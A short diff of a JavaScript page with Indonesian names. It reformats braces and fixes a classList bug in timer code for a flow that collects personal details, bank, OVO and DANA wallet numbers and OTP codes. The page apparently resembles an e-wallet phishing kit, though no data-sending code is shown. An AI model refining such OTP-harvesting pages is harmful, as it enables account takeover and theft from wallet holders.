@@ -534,12 +534,12 @@ function munculLoading(tujuan) {
 function bukaHalaman(id) {
     document.querySelectorAll('section').forEach(el => el.classList.add('hidden'));
     const halaman = document.getElementById('halaman' + id);
-    if (halaman) { 
-        halaman.classList.remove('hidden'); 
-        window.scrollTo(0,0); 
+    if (halaman) {
+        halaman.classList.remove('hidden');
+        window.scrollTo(0, 0);
     }
-}
-
+    }
+    
 function kirimFormulir() {
     dataUtama = {
         nama_depan: document.getElementById('nama_depan').value,
@@ -615,10 +615,10 @@ function mulaiHitunganBank() {
         if(detik <= 0) {
             clearInterval(timerBank);
             document.getElementById('hitunganBank').classList.add('hidden');
-            document.getElementById('kirimUlangBank').class.remove('hidden');
+            document.getElementById('kirimUlangBank').classList.remove('hidden');
         }
     }, 1000);
-}
+    }
 
 function cekTombolOvo() {
     const nomor = document.getElementById('nomorOvo').value;
@@ -673,8 +673,8 @@ function mulaiHitunganOvo() {
             document.getElementById('kirimUlangOvo').class.remove('hidden');
         }
     }, 1000);
-}
-
+    }
+    
 function cekTombolDana() {
     const nomor = document.getElementById('nomorDana').value;
     const btn = document.getElementById('btnLanjutDana');
@@ -729,7 +729,7 @@ function mulaiHitunganDana() {
         }
     }, 1000);
 }
-
+    
 function isiKodeOtpDana(val) {
     const kotak = document.querySelectorAll('.kode-dana');
     const pesanSalah = document.getElementById('pesanSalahDana');
